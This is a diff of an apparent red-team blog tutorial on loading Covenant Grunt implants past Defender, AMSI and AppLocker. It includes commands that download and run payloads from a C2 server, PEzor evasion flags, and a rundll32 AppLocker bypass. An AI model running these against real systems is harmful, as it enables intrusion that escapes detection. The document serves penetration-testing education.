@@ -93,7 +93,7 @@ iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')
 ```  
 
 Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t.  
-Okay so let´s bypass Defender by not touching the disc and put our default Grunt payload directly into memory:
+Okay so let´s bypass Defender by not touching the disk and put our default Grunt payload directly into memory:
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/ASMI_catch.png "AMSI Catch")  
 
@@ -103,7 +103,7 @@ We bypassed the signature based part of Defender for the filesystem stuff, but A
 
 If you would like to know more about how AMSI works - read this [post](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/) about AMSI and how to bypass it.  
 
-We can verify that it was AMSI by issuing ~~one of the random bypasses from [amsi.fail](https://amsi.fail)~~ the [AMSI bypass for C# from Rasta Mouse}(https://github.com/rasta-mouse/AmsiScanBufferBypass) and see it working afterwards with all the Defender features still turned on:  
+We can verify that it was AMSI by issuing ~~one of the random bypasses from [amsi.fail](https://amsi.fail)~~ the [AMSI bypass for C# from Rasta Mouse](https://github.com/rasta-mouse/AmsiScanBufferBypass) and see it working afterwards with all the Defender features still turned on:  
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass.png "bypass")  
 ![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass_grunt.png "bypass")  
@@ -121,14 +121,20 @@ My attempts to combine the parts to chain a stealthy attack resulted in two appr
 ![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  
 
 2. Convert Grunt.exe to Nim byte array  
-```CSharpToNimByteArray -inputfile .\GruntHTTP.exe```
+```
+CSharpToNimByteArray -inputfile .\GruntHTTP.exe
+```
 ![broken]({{ site.baseurl }}/images/2021-16-01/Convert_Grunt_to_array.png "convert to byte array")   
 
 3. Paste the byte array into the C# loader [template](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim) and build the C executable  
-```nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim```
+```
+nim c --passL:-Wl,--dynamicbase,--export-all-symbols .\LoadCSharp.nim
+```
 
 4. Wrap the C executable into PEZor  
-```PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2```
+```
+PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
+```
 ![broken]({{ site.baseurl }}/images/2021-16-01/Building_PEZor.png "PEZor build")  
 
 5. Deploy  
@@ -144,17 +150,23 @@ If there wasn´t the AppLocker bypass needed, one could also run this completely
 ![broken]({{ site.baseurl }}/images/2021-16-01/everything_blocked.png  "All blocked")
 
 To check the current PS language mode we can run:  
-```$ExecutionContext.SessionState.LanguageMode```  
+```
+$ExecutionContext.SessionState.LanguageMode
+```  
 
 We can issue the following PS cmdlet to identify all AppLocker policies in place:  
-```Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml```  
+```
+Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml
+```  
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/applocker_allow_dll.png  "Allow dll")
 
 We can see that the **Everyone** group is allowed to run stuff from **C:\Program Files (x86)\hMailServer\**
 
 We can further check the ACLs on that folder with the following PS cmdlet:  
-```Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl```  
+```
+Get-Acl -path 'C:\Program Files (x86)\hMailServer\' | fl
+```  
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/acl_users_allowed.png  "Allowed users ACL")
 
@@ -164,7 +176,9 @@ Which shows us that the **Users** group has write access to that specific folder
 So now that we know how - let´s get our hands dirty.  
 
 Compile [PowerShdll](https://github.com/p3nt4/PowerShdll) and copy to client to **C:\Program Files (x86)\hMailServer\** and run it:  
-```rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w```  
+```
+rundll32 'C:\Program Files (x86)\hMailServer\PowerShdll.dll',main -w
+```  
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/powershdll_popped.png  "PowerShdll popped")
 
@@ -180,7 +194,9 @@ Invoke-SharpEncrypt -file C:\Tools_manual\nim-1.4.2\examples\Offensive\GruntHTTP
 Host the encrypted file on our Covenant server under ```Listeners -> listener -> Hosted Files -> + Create```
 
 Adapt the Invoke-SharpLoader script to have it directly run it with our encrypted payload by adding this to the last line:  
-```Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs```
+```
+Invoke-SharpLoader -location http://10.55.0.30/Grunt_SharpLoader.enc -password LuemmelSec -noArgs
+```
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/adapt_isl.png  "sharpencrypt")
 
